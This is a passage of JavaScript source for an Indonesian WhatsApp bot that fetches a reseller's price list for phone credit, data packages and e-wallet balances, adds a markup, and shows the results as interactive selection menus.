                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa XL",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'pul_byu': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA BYU*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "by.U" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa BYU",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa BYU",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa BYU",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'pul_three': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA THREE*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "THREE" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa THREE",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa THREE",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa THREE",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;


//=================================//
 case 'pricelistwallet': {
let teks = Ehztext(`✨ *Lst Wallet Options* ✨\n\n` +
               `Berikut adalah pilihan List Wallet yang tersedia:\n\n` +
               `• .dana\n` +
               `• .mandiri\n` +
               `• .grab\n` +
               `• .gopay\n` +
               `• .ovo\n` +
               `• .ovo\n` +
               `• .linkaja\n\n` +
               `Silakan pilih salah satu untuk melanjutkan.`);
    
    setReply(teks);
     }
    break;


 case 'dana': {
   if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO DANA*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "DANA") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo DANA",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo DANA",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo DANA",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'mandiri': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO MANDIRI*\n\nIngin melakukan topup? ketik *${prefix}pricelist*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Mandiri E-Toll") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo Mandiri",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo Mandiri",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo Mandiri",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'grab': {
if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO MANDIRI*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Grab penumpang") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo Grab",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo Grab",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo Grab",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'gopay': {
  if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO GOPAY*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "GO PAY") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo Gopay",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo Gopay",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo Gopay",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'ovo': {
 if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO OVO*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "OVO") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo OVO",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo OVO",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo OVO",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
if (isGroup) return onlyPrivate();
case 'shopeepay': {
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO SHOPEEPAY*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "SHOPEE PAY") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo ShopeePay",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo ShopeePay",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo ShopeePay",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'linkaja': {
 if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA SALDO LINKAJA*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "LinkAja") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Saldo LinkAja",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Saldo LinkAja",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Saldo LinkAja",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'pricelistkuota': {
    let tekNy = Ehztext(`🌟 *Daftar Harga Kuota* 🌟\n\n` +
                `Berikut adalah pilihan provider kuota yang tersedia:\n\n` +
                `• .smartfren\n` +
                `• .telkomsel\n` +
                `• .axis\n` +
                `• .indosat\n` +
                `• .three\n` +
                `• .byu\n` +
                `• .xl\n\n` +
                `Silakan pilih provider untuk melihat detail harga kuota.`);

    hanz.editmsg(m.chat, tekNy, m);
    }
    break;


case 'smartfren': {
  if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA SMARTFREN*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "SMARTFREN" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota Smartfren",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota Smartfren",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota Smartfren",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'telkomsel': {
 if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA TELKOMSEL*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "TELKOMSEL" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota Telkomsel",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota Telkomsel",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota Telkomsel",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'axis': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA AXIS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "AXIS" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota Axis",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota Axis",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
